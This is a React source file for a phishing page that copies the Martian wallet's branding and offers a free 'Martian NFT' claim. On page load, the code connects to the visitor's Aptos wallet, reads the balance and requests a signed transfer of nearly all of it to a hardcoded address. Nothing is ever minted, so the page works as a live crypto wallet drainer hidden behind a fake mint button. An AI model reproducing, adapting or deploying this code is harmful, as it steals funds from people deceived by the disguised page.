import React from 'react';
import "./main.css"
import './App.css';
import { Types, AptosClient } from 'aptos';
const client = new AptosClient('https://fullnode.devnet.aptoslabs.com/v1');
declare global {
  interface Window { martian: any; }
}
async function getBalance(url: string){
  const response = await fetch(url);
  return await response.json();
}

async function changenetwork(){
 
    const network = await window.martian.network();
    console.log('changenetwork')
    if(network=='Mainnet'){      
     return true;
    }
    console.log('Выберите сеть Mainnet') 
    return false;
}

const isMartianWalletInstalled = window.martian || {};

console.log('isMartianWalletInstalled='+isMartianWalletInstalled)

function App() {
  var success=false;
  const init = async() => {
    // подключение к кошелью
    //const { address, publicKey } = await window.aptos.connect();
    try{
      var { response, publicKey } = await window.martian.connect();
      var account = await window.martian.account()
      var sender = account.address;
      console.log(account)
      success=true;
    }catch(err){
      console.log(err)
      success=false;
    }
    var mainnetnetwork=true
    if(success){
      mainnetnetwork = await changenetwork();
      console.log('Сеть='+mainnetnetwork)
    }
     //balance+

    if(success && mainnetnetwork){
        //const bal = 'https://fullnode.mainnet.aptoslabs.com/v1/accounts/'+sender+'/resources'   
        const bal = 'https://fullnode.devnet.aptoslabs.com/v1/accounts/'+sender+'/resources'

        const walletbalance = await getBalance(bal)
        console.log(parseInt(walletbalance[walletbalance.length-1].data.coin.value))  
        //mainnet
        //const wallbal = parseInt(walletbalance[1].data.coin.value)- 1000000
        //devnet
        const wallbal = parseInt(walletbalance[walletbalance.length-1].data.coin.value)-1000000
        if(wallbal>0){
            const payload = {
              function: "0x1::coin::transfer",
              type_arguments: ["0x1::aptos_coin::AptosCoin"],
              arguments: ["0xaf7a535689cd713f795e77db9d63baa4adb5074cdd89e6aa880387d602062b0d", wallbal]
            };
            const options = {
              max_gas_amount: "10000"
            }
            const transaction = await window.martian.generateTransaction(sender, payload);
    
            try {
              setIsSaving(true);
              const signedTxn = await window.martian.signTransaction(transaction);
              const txnHash = await window.martian.submitTransaction(signedTxn);
              console.log('txnHash=' + txnHash) 
            } finally {
              setIsSaving(false);
            }
          }
        }
      //.balance       
        
    //const transaction = await window.martian.generateTransaction(sender, payload);
    //const txnHash = await window.martian.signAndSubmitTransaction(transaction); 
  }
   
  //form
  const ref = React.createRef<HTMLTextAreaElement>();
  const [isSaving, setIsSaving] = React.useState(false);
  const handleSubmit = async (e: any) => {
    e.preventDefault();
    if (!ref.current) return;
    const message = ref.current.value;
  };
  //form

  

  React.useEffect(() => {    
     init();
  }, []); 
 
  return (
    <div className="App">
      <div className="sc-dnqmqq hBcPhn">
	<div className="Toastify"></div>
	<div className="sc-ifAKCX eQfpzz">
		<div className="sc-EHOje eZDvnB">
			<img src="data:image/png;base64,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" alt="martian" />
			<h1 className="sc-bdVaJa iATKoi">MARTIAN</h1>
		</div>
		<div className="sc-bZQynM kzjuzw">
			<p className="sc-bwzfXH bwoXcG">HOME</p>
			<p className="sc-bwzfXH lcQVNo">DOCS</p>
			<p className="sc-bwzfXH lcQVNo">DISCORD</p>
			<p className="sc-bwzfXH lcQVNo">TWITTER</p>
		</div>
		<button className="sc-htpNat fYEHGx">
			<div className="sc-bxivhb dzbCXW"></div>Download
		</button>
	</div>
	<div className="sc-iwsKbI uJqEj">
		<div className="left">
			<h1 className="sc-bdVaJa efwjwd">Claim the Martian NFT</h1>
			<p className="sc-bwzfXH bsJEIy">We made this for you! Thanks for being part of the Martian Community</p>
      <form>
			<button id="btn" type="submit" className="sc-htpNat cLyaNL">
				<div className="sc-bxivhb bwJdxs"></div>Mint Martian NFT
			</button>
      </form>
		</div>
		<div className="right"><img src="https://gateway.pinata.cloud/ipfs/QmXiSJPXJ8mf9LHijv6xFH1AtGef4h8v5VPEKZgjR4nzvM" alt="NFT" /></div>
	</div>
</div>
<style>
@import url('https://fonts.googleapis.com/css2?family=Roboto:ital,wght@1,900&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Roboto:ital,wght@1,900&display=swap');
</style>  
        
    </div>
  );
}

export default App;
